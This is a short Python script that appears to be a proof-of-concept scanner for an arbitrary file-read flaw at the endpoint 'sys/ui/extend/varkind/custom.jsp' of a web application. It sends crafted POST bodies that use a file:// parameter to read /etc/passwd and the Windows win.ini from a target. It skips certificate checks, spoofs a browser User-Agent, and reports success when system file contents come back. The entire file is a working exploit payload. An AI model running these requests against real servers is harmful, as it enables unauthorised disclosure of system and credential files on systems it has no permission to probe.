import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"sys/ui/extend/varkind/custom.jsp"
	body='var={"body":{"file":"file:///etc/passwd"}}'
	headers={
		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Accept-Encoding': 'gzip',
		}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "root:" in response.text:
		linux0=True
	else:
		linux0=False
	url=baseurl+"sys/ui/extend/varkind/custom.jsp"
	body='var={"body":{"file":"file:///c://windows/win.ini"}}'
	headers={
		'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Accept-Encoding': 'gzip',
		}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "for 16-bit app support" in response.text:
		windows0=True
	else:
		windows0=False
	if windows0 or linux0:
		return True
	else:
		return False
